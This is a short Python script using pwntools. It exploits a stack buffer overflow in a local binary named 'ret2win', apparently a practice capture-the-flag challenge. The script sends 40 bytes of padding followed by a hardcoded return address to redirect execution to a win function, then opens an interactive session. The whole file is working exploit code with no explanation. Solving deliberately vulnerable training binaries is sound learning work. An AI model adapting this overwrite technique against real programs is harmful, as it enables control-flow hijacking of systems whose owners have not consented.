from pwn import *

p = process('./ret2win')

junk = "A" * 40
ret2win_addr = 0x400811

payload = junk + p64(ret2win_addr)

p.recvuntil('> ')
p.sendline(payload)
p.interactive()

